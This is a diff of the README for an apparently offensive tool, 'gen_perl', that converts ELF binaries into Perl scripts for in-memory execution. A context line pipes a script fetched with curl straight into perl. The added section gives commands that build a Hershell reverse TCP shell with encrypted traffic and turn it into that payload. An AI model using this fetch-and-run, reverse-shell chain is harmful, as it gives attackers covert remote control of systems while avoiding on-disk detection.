@@ -32,5 +32,14 @@ curl http://127.0.0.1:8080/hack.pl | perl
 #### file info
 ![file_info](https://github.com/purpleroc/gen_perl/raw/master/pic/file.png)
 
+## Other
+You can also use [Hershell](https://github.com/sysdream/hershell) to generate a reverse_tcp shell with ssl encrypt netflow.
+```
+make depends 
+make linux64 LHOST=127.0.0.1 LPORT=1234  
+# and then use gen_perl to convert it to hack.pl
+./gen_perl.sh hershell hack.pl hello_hacker
+```
+
 ## Reference
 [In-Memory-Only ELF Execution](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)
